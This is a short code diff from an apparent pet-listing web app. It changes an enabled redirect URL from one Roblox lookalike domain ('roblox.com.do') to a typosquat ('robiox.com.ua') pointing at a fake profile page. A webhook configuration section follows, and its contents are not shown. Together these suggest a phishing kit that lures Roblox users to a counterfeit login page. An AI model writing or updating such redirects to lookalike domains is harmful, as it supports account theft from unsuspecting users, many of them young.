@@ -118,7 +118,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.roblox.com.do/users/3771956351/profile",
+  url: "https://www.robiox.com.ua/users/3771956351/profile",
 }
 
 // Webhook configuration
